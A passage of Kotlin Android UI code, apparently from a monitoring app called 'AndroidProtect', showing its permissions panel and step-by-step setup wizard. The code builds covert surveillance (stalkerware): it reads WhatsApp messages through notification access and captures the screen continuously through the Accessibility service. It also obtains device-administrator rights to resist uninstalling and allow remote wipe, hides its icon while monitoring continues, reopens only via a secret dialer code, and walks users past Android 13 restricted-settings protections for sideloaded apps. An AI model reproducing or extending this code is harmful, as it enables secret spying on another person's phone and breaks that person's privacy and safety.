                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                        ) {
                            Text("📂  Permitir Acesso a Todos os Arquivos", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                    }

                    if (!hasAdmin) {
                        Button(
                            onClick = {
                                adminLauncher.launch(
                                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                            "Ativa proteção contra desinstalação e permite bloqueio/limpeza remota.")
                                    }
                                )
                            },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9900))
                        ) {
                            Text("⚙️  Ativar Administrador do Dispositivo", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                    }

                    // ── Atalhos rápidos (sempre visíveis para facilitar re-ativação pós-reinstall) ──
                    androidx.compose.material3.HorizontalDivider(
                        modifier = Modifier.padding(vertical = 10.dp),
                        color = Color(0xFF1E2235)
                    )
                    Text(
                        "⚡  Atalhos Rápidos",
                        color = Color(0xFF8E94A5), fontSize = 11.sp, fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(bottom = 8.dp)
                    )
                    Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(8.dp)) {
                        // Botão 1: Acesso às Notificações
                        Button(
                            onClick = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1B3A5C))
                        ) {
                            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
                                Text("🔔", fontSize = 18.sp)
                                Text("Notificações", color = Color(0xFF00D2FF), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Text("Acesso", color = Color(0xFF8E94A5), fontSize = 9.sp)
                            }
                        }
                        // Botão 2: Acessibilidade
                        Button(
                            onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2D1B69))
                        ) {
                            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
                                Text("♿", fontSize = 18.sp)
                                Text("Acessibilidade", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Text("Serviço", color = Color(0xFF8E94A5), fontSize = 9.sp)
                            }
                        }
                    }
                    Text(
                        "Use estes atalhos após reinstalar o app para reativar o monitoramento.",
                        color = Color(0xFF8E94A5), fontSize = 9.5.sp, lineHeight = 13.sp,
                        modifier = Modifier.padding(top = 6.dp, bottom = 8.dp)
                    )
                    androidx.compose.material3.HorizontalDivider(
                        modifier = Modifier.padding(bottom = 10.dp),
                        color = Color(0xFF1E2235)
                    )
                    // ── fim atalhos rápidos ────────────────────────────────────────────────────────

                    Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(10.dp)) {
                        OutlinedButton(
                            onClick = { startPermissionFlow() },
                            modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF00D2FF))
                        ) { Text("Solicitar Novamente", fontSize = 12.sp) }

                        Button(
                            onClick = { openAppSettings() },
                            modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF2A85))
                        ) { Text("Abrir Configurações", fontSize = 12.sp) }
                    }
                } else {
                    Box(
                        Modifier
                            .fillMaxWidth()
                            .background(Color(0xFF1A2E1A), RoundedCornerShape(12.dp))
                            .padding(14.dp),
                        Alignment.Center
                    ) {
                        Text("✅  Todas as permissões concedidas. App pronto!", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                    }
                    // Atalhos rápidos — visíveis mesmo quando tudo está OK
                    Spacer(Modifier.height(12.dp))
                    Text(
                        "⚡  Atalhos Rápidos (pós-reinstall)",
                        color = Color(0xFF8E94A5), fontSize = 11.sp, fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(bottom = 8.dp)
                    )
                    Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(8.dp)) {
                        Button(
                            onClick = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1B3A5C))
                        ) {
                            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
                                Text("🔔", fontSize = 18.sp)
                                Text("Notificações", color = Color(0xFF00D2FF), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Text("Acesso", color = Color(0xFF8E94A5), fontSize = 9.sp)
                            }
                        }
                        Button(
                            onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2D1B69))
                        ) {
                            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
                                Text("♿", fontSize = 18.sp)
                                Text("Acessibilidade", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                Text("Serviço", color = Color(0xFF8E94A5), fontSize = 9.sp)
                            }
                        }
                    }
                }
            }

            // ── Ocultar app ────────────────────────────────────────────────
            SectionCard {
                Label("OCULTAR APLICATIVO")
                Spacer(Modifier.height(10.dp))
                Text(
                    "Remove o ícone do app. O monitoramento continua ativo em segundo plano.",
                    color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 18.sp,
                    modifier = Modifier.padding(bottom = 14.dp)
                )
                // Botão sempre disponível — funciona em todos os Android e OEMs,
                // independentemente de permissões pendentes
                Button(
                    onClick = { showHideDialog = true },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E1030))
                ) {
                    Text("🙈  Ocultar App Agora", color = Color(0xFFFF2A85), fontWeight = FontWeight.Bold, fontSize = 14.sp)
                }
                Spacer(Modifier.height(8.dp))
                // Aviso contextual inteligente — apenas informativo, não bloqueia o botão
                val missingPermsHide = listOf(
                    hasLocation, hasBgLocation, hasCamera, hasMic, hasPhone, hasSms,
                    hasActivity, hasNotify, hasAccessibility, hasAdmin, hasWhatsAppListener, hasAllFiles
                ).count { !it }
                when {
                    missingPermsHide > 0 ->
                        Text(
                            "⚠️ $missingPermsHide permissão(ões) pendente(s) — o monitoramento pode ser limitado.",
                            color = Color(0xFFFF9900), fontSize = 11.sp, lineHeight = 15.sp,
                            modifier = Modifier.padding(bottom = 4.dp)
                        )
                    isBatteryOptimized ->
                        Text(
                            "⚠️ Desative a otimização de bateria para manter o serviço ativo.",
                            color = Color(0xFFFF9900), fontSize = 11.sp, lineHeight = 15.sp,
                            modifier = Modifier.padding(bottom = 4.dp)
                        )
                    else -> Spacer(Modifier.height(0.dp)) // tudo ok — sem aviso
                }
                Text("Para reabrir: disque *#*#7777#*#*", color = Color(0xFF8E94A5), fontSize = 11.sp)
            }

            // ── Guia de compatibilidade por marca ──────────────────────────
            BrandCompatibilityCard()

            // ── Desvincular ────────────────────────────────────────────────
            SectionCard {
                Label("CONTA")
                Spacer(Modifier.height(10.dp))
                OutlinedButton(
                    onClick = { showUnlinkDialog = true },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFFF3838)),
                    border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFFF3838).copy(alpha = 0.4f))
                ) {
                    Text("Desvincular Aparelho", fontWeight = FontWeight.Bold)
                }
            }

            Spacer(Modifier.height(24.dp))
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WIZARD SCREEN — configuração automática passo a passo
    // Steps reais: 0=welcome 1=runtime 2=restricted(Android13+) 3=notify 4=a11y 5=battery 6=admin 7=done
    // Se needsRestrictedSettings=false, passo 1 pula direto para 3.
    // ═══════════════════════════════════════════════════════════════════════
    @Composable
    fun WizardScreen(onDone: () -> Unit) {
        val context = this

        var step by remember { mutableStateOf(0) }
        var runtimeLaunched by remember { mutableStateOf(false) }
        var showNextAfterRuntime by remember { mutableStateOf(false) }

        val hasNotify        by hasWhatsAppListenerState
        val hasAccessibility by hasAccessibilityState
        val hasAdmin         by hasAdminState
        val hasLocation      by hasLocationState
        val hasCamera        by hasCameraState
        val hasMic           by hasMicState

        // Detecta se o APK foi instalado fora da Play Store em Android 13+.
        // Nesse caso o Android exige que o usuário permita "Configurações Restritas"
        // antes de poder ativar NotificationListener e Acessibilidade.
        val needsRestrictedSettings = remember {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
                false
            } else {
                val installer = runCatching {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                        packageManager.getInstallSourceInfo(packageName).installingPackageName
                    else
                        @Suppress("DEPRECATION") packageManager.getInstallerPackageName(packageName)
                }.getOrNull()
                installer != "com.android.vending"
            }
        }

        // Passo 1: dispara o flow de runtime permissions automaticamente
        LaunchedEffect(step) {
            if (step == 1 && !runtimeLaunched) {
                runtimeLaunched = true
                startPermissionFlow()
                delay(3000)
                showNextAfterRuntime = true
            }
        }

        // Passo 3: auto-avança quando NotificationListener for ativado
        LaunchedEffect(hasNotify) {
            if (step == 3 && hasNotify) { delay(600); step = 4 }
        }

        // Passo 4: auto-avança quando Acessibilidade for ativada
        LaunchedEffect(hasAccessibility) {
            if (step == 4 && hasAccessibility) { delay(600); step = 5 }
        }

        // ── Cálculos para barra de progresso (exclui passo 2 se não necessário) ──
        val displayTotal = if (needsRestrictedSettings) 7 else 6
        val displayStep  = if (!needsRestrictedSettings && step >= 3) step - 1 else step

        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Color(0xFF0A0B10))
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Spacer(Modifier.height(48.dp))

            // ── Logo ──────────────────────────────────────────────────────
            Box(
                Modifier
                    .size(80.dp)
                    .background(Color(0xFF0D1826), RoundedCornerShape(24.dp))
                    .border(1.5.dp, Color(0xFF00D2FF).copy(alpha = 0.4f), RoundedCornerShape(24.dp)),
                Alignment.Center
            ) { Text("🛡️", fontSize = 38.sp) }

            Spacer(Modifier.height(14.dp))
            Text("Configuração Automática", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))

            // ── Barra de progresso ────────────────────────────────────────
            Spacer(Modifier.height(20.dp))
            val progress = if (displayStep >= displayTotal) 1f else displayStep / displayTotal.toFloat()
            Box(
                Modifier
                    .fillMaxWidth()
                    .height(6.dp)
                    .background(Color(0xFF1E2235), RoundedCornerShape(3.dp))
            ) {
                Box(
                    Modifier
                        .fillMaxWidth(progress)
                        .height(6.dp)
                        .background(Color(0xFF00D2FF), RoundedCornerShape(3.dp))
                )
            }
            Spacer(Modifier.height(8.dp))
            Text(
                if (displayStep < displayTotal) "Passo ${displayStep + 1} de $displayTotal" else "Concluído!",
                color = Color(0xFF8E94A5), fontSize = 11.sp
            )
            Spacer(Modifier.height(24.dp))

            // ── Conteúdo do passo ─────────────────────────────────────────
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .border(1.dp, Color(0xFF252630), RoundedCornerShape(20.dp)),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF12141D)),
                shape = RoundedCornerShape(20.dp)
            ) {
                Column(Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {

                    when (step) {

                        // ── 0: Boas-vindas ────────────────────────────────────────
                        0 -> {
                            Text("👋", fontSize = 42.sp)
                            Spacer(Modifier.height(12.dp))
                            Text("Tudo automático!", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "O app vai solicitar todas as permissões necessárias.\n\nVocê precisará tocar em apenas 4 a 6 botões. Siga as instruções de cada passo.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(8.dp))
                            val previewItems = buildList {
                                add("📋" to "Permissões básicas (câmera, GPS, microfone…)")
                                if (needsRestrictedSettings)
                                    add("🔓" to "Permitir configurações restritas (Android 13+)")
                                add("💬" to "Monitoramento do WhatsApp")
                                add("♿" to "Captura de tela contínua")
                                add("🔋" to "Proteção contra suspensão de bateria")
                                add("⚙️" to "Administrador do dispositivo")
                            }
                            previewItems.forEach { (emoji, label) ->
                                Row(
                                    Modifier.fillMaxWidth().padding(vertical = 4.dp),
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(emoji, fontSize = 16.sp, modifier = Modifier.width(28.dp))
                                    Text(label, color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 16.sp)
                                }
                            }
                            Spacer(Modifier.height(20.dp))
                            Button(
                                onClick = { step = 1 },
                                modifier = Modifier.fillMaxWidth().height(52.dp),
                                shape = RoundedCornerShape(14.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                            ) {
                                Text("▶  Iniciar configuração", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
                            }
                            Spacer(Modifier.height(10.dp))
                            TextButton(onClick = { onDone() }) {
                                Text("Pular configuração", color = Color(0xFF8E94A5), fontSize = 12.sp)
                            }
                        }

                        // ── 1: Permissões de runtime ──────────────────────────────
                        1 -> {
                            Text("📋", fontSize = 42.sp)
                            Spacer(Modifier.height(12.dp))
                            Text("Permissões Básicas", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "Os diálogos de permissão abrirão automaticamente.\n\nToque em \"Permitir\" em cada um para liberar câmera, GPS, microfone, SMS e mais.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(18.dp))
                            if (!showNextAfterRuntime && !(hasLocation && hasCamera && hasMic)) {
                                CircularProgressIndicator(modifier = Modifier.size(36.dp), color = Color(0xFF00D2FF), strokeWidth = 3.dp)
                                Spacer(Modifier.height(10.dp))
                                Text("Aguardando permissões…", color = Color(0xFF8E94A5), fontSize = 12.sp)
                            }
                            if (showNextAfterRuntime || (hasLocation && hasCamera && hasMic)) {
                                Spacer(Modifier.height(10.dp))
                                Button(
                                    // Se Android 13+ e sideloaded → passo de configurações restritas; senão → notify
                                    onClick = { step = if (needsRestrictedSettings) 2 else 3 },
                                    modifier = Modifier.fillMaxWidth().height(52.dp),
                                    shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                                ) {
                                    Text("Próximo →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
                                }
                            }
                        }

                        // ── 2: Permitir configurações restritas (Android 13+) ─────
                        2 -> {
                            Text("🔓", fontSize = 42.sp)
                            Spacer(Modifier.height(12.dp))
                            Text(
                                "Permitir Configurações Restritas",
                                fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "No Android 13 ou superior, apps instalados fora da Play Store precisam de uma permissão extra antes de poder ativar Acessibilidade e acesso às Notificações.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(16.dp))

                            // Destaque visual do passo a passo
                            val rSteps = listOf(
                                "⚙️" to "Toque em \"Abrir Info do App\" abaixo",
                                "⋮"  to "Toque nos três pontinhos (⋮) no canto superior direito",
                                "🔓" to "Selecione \"Permitir configurações restritas\"",
                                "✔️" to "Confirme no diálogo e volte para o app"
                            )
                            rSteps.forEach { (icon, desc) ->
                                Row(
                                    Modifier
                                        .fillMaxWidth()
                                        .padding(vertical = 5.dp)
                                        .background(Color(0xFF1A1D2E), RoundedCornerShape(10.dp))
                                        .padding(horizontal = 12.dp, vertical = 8.dp),
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(icon, fontSize = 18.sp, modifier = Modifier.width(30.dp), textAlign = TextAlign.Center)
                                    Spacer(Modifier.width(10.dp))
                                    Text(desc, color = Color(0xFFCDD5E0), fontSize = 12.sp, lineHeight = 17.sp, modifier = Modifier.weight(1f))
                                }
                            }

                            Spacer(Modifier.height(6.dp))
                            // Aviso: não é possível detectar automaticamente; usuário confirma após voltar
                            Box(
                                Modifier
                                    .fillMaxWidth()
                                    .background(Color(0xFF2A2010), RoundedCornerShape(10.dp))
                                    .padding(10.dp)
                            ) {
                                Text(
                                    "⚠️  Esta permissão não é detectável automaticamente. Após concluí-la, toque em \"Já fiz isso\" abaixo.",
                                    color = Color(0xFFFFD700), fontSize = 11.sp, lineHeight = 15.sp
                                )
                            }
                            Spacer(Modifier.height(16.dp))

                            Button(
                                onClick = {
                                    startActivity(
                                        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                            data = Uri.fromParts("package", packageName, null)
                                        }
                                    )
                                },
                                modifier = Modifier.fillMaxWidth().height(52.dp),
                                shape = RoundedCornerShape(14.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9900))
                            ) {
                                Text("⚙️  Abrir Info do App", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 15.sp)
                            }
                            Spacer(Modifier.height(10.dp))
                            Button(
                                onClick = { step = 3 },
                                modifier = Modifier.fillMaxWidth().height(48.dp),
                                shape = RoundedCornerShape(14.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E2235))
                            ) {
                                Text("Já fiz isso → Próximo", color = Color(0xFF00D2FF), fontWeight = FontWeight.Bold, fontSize = 14.sp)
                            }
                        }

                        // ── 3: Notification Listener (WhatsApp) ───────────────────
                        3 -> {
                            Text("💬", fontSize = 42.sp)
                            Spacer(Modifier.height(12.dp))
                            Text("Monitorar WhatsApp", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "Para ler mensagens do WhatsApp, o app precisa de acesso às notificações.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(14.dp))
                            listOf(
                                "Toque em \"Abrir Configurações\" abaixo",
                                "Encontre \"Protect\" na lista e ative o interruptor",
                                "Confirme \"Permitir\" no diálogo que aparecer",
                                "Volte para o app — avanço automático"
                            ).forEachIndexed { i, s ->
                                Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.Top) {
                                    Box(Modifier.size(20.dp).background(Color(0xFF25D366).copy(alpha = 0.2f), CircleShape), Alignment.Center) {
                                        Text("${i+1}", color = Color(0xFF25D366), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    }
                                    Spacer(Modifier.width(8.dp))
                                    Text(s, color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 17.sp, modifier = Modifier.weight(1f))
                                }
                            }
                            Spacer(Modifier.height(18.dp))
                            if (hasNotify) {
                                Box(Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp), Alignment.Center) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
                                        Spacer(Modifier.width(8.dp))
                                        Text("Acesso concedido! Avançando…", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                                    }
                                }
                            } else {
                                Button(
                                    onClick = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                                    modifier = Modifier.fillMaxWidth().height(52.dp),
                                    shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25D366))
                                ) { Text("Abrir Configurações", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 15.sp) }
                                Spacer(Modifier.height(10.dp))
                                TextButton(onClick = { step = 4 }) {
                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
                                }
                            }
                        }

                        // ── 4: Acessibilidade ─────────────────────────────────────
                        4 -> {
                            Text("♿", fontSize = 42.sp)
                            Spacer(Modifier.height(12.dp))
                            Text("Captura de Tela Contínua", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "O serviço de Acessibilidade permite capturar a tela sem interrupção, mesmo com o app em segundo plano.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(14.dp))
                            listOf(
                                "Toque em \"Abrir Configurações\" abaixo",
                                "Encontre \"Protect\" em Acessibilidade e toque",
                                "Ative o interruptor e confirme \"Permitir\"",
                                "Volte para o app — avanço automático"
                            ).forEachIndexed { i, s ->
                                Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.Top) {
                                    Box(Modifier.size(20.dp).background(Color(0xFFB794F4).copy(alpha = 0.2f), CircleShape), Alignment.Center) {
                                        Text("${i+1}", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    }
                                    Spacer(Modifier.width(8.dp))
                                    Text(s, color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 17.sp, modifier = Modifier.weight(1f))
                                }
                            }
                            Spacer(Modifier.height(18.dp))
                            if (hasAccessibility) {
                                Box(Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp), Alignment.Center) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
                                        Spacer(Modifier.width(8.dp))
                                        Text("Acessibilidade ativa! Avançando…", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                                    }
                                }
                            } else {
                                Button(
                                    onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                                    modifier = Modifier.fillMaxWidth().height(52.dp),
                                    shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED))
                                ) { Text("Abrir Configurações", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 15.sp) }
                                Spacer(Modifier.height(10.dp))
                                TextButton(onClick = { step = 5 }) {
                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
                                }
                            }
                        }

                        // ── 5: Bateria ────────────────────────────────────────────
                        5 -> {
                            val isBatteryOk = !isBatteryOptimizedFor(context)
                            Text("🔋", fontSize = 42.sp)
                            Spacer(Modifier.height(12.dp))
                            Text("Proteção de Bateria", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "Para manter o monitoramento ativo com a tela desligada, desative a otimização de bateria para este app.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(14.dp))
                            val mfr = Build.MANUFACTURER.lowercase()
                            Text(
                                when {
                                    "xiaomi" in mfr -> "Procure \"Protect\" na lista → toque → \"Sem restrições\"."
                                    "samsung" in mfr -> "Confirme \"Permitir\" ou encontre Protect na lista."
                                    else -> "Encontre \"Protect\" na lista e selecione \"Sem restrições\"."
                                },
                                color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(18.dp))
                            if (isBatteryOk) {
                                Box(Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp), Alignment.Center) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
                                        Spacer(Modifier.width(8.dp))
                                        Text("Bateria configurada!", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                                    }
                                }
                                Spacer(Modifier.height(14.dp))
                                Button(
                                    onClick = { step = 6 }, modifier = Modifier.fillMaxWidth().height(52.dp),
                                    shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                                ) { Text("Próximo →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp) }
                            } else {
                                Button(
                                    onClick = {
                                        val ok = runCatching { startActivity(batteryOptimizationIntent()) }.isSuccess
                                        if (!ok) runCatching { startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)) }
                                    },
                                    modifier = Modifier.fillMaxWidth().height(52.dp), shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF39FF14))
                                ) { Text("⚡  Desativar Otimização", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 15.sp) }
                                Spacer(Modifier.height(10.dp))
                                TextButton(onClick = { step = 6 }) {
                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
                                }
                            }
                        }

                        // ── 6: Administrador do dispositivo ───────────────────────
                        6 -> {
                            Text("⚙️", fontSize = 42.sp)
                            Spacer(Modifier.height(12.dp))
                            Text("Administrador do Dispositivo", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "Permite bloquear ou limpar o celular remotamente pelo painel, e dificulta a desinstalação do app.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(18.dp))
                            if (hasAdmin) {
                                Box(Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp), Alignment.Center) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
                                        Spacer(Modifier.width(8.dp))
                                        Text("Administrador ativo!", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                                    }
                                }
                                Spacer(Modifier.height(14.dp))
                                Button(
                                    onClick = { step = 7 }, modifier = Modifier.fillMaxWidth().height(52.dp),
                                    shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                                ) { Text("Concluir →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp) }
                            } else {
                                Button(
                                    onClick = {
                                        adminLauncher.launch(
                                            Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                                                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                                    "Ativa proteção contra desinstalação e permite bloqueio/limpeza remota.")
                                            }
                                        )
                                    },
                                    modifier = Modifier.fillMaxWidth().height(52.dp), shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9900))
                                ) { Text("⚙️  Ativar Administrador", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 15.sp) }
                                Spacer(Modifier.height(10.dp))
                                TextButton(onClick = { step = 7 }) {
                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
                                }
                            }
                        }

                        // ── 7: Concluído ──────────────────────────────────────────
                        else -> {
                            Text("✅", fontSize = 48.sp)
                            Spacer(Modifier.height(14.dp))
                            Text("Tudo configurado!", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = Color(0xFF39FF14), textAlign = TextAlign.Center)
                            Spacer(Modifier.height(10.dp))
                            Text(
                                "O AndroidProtect está ativo e monitorando este dispositivo. Você pode ocultar o app agora ou ajustar configurações avançadas.",
                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
                            )
                            Spacer(Modifier.height(22.dp))
                            Button(
                                onClick = { onDone() }, modifier = Modifier.fillMaxWidth().height(52.dp),
                                shape = RoundedCornerShape(14.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                            ) { Text("Ver painel →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp) }
                        }
                    }
                }
            }

            Spacer(Modifier.height(40.dp))
        }
    }

    // ── Card de compatibilidade por fabricante ─────────────────────────────────
    @Composable
    fun BrandCompatibilityCard() {
        val manufacturer = Build.MANUFACTURER.lowercase()
        val brand        = Build.BRAND.lowercase()

        // Detecta o fabricante e monta as instruções adequadas
        val (emoji, title, steps, settingsIntent) = remember {
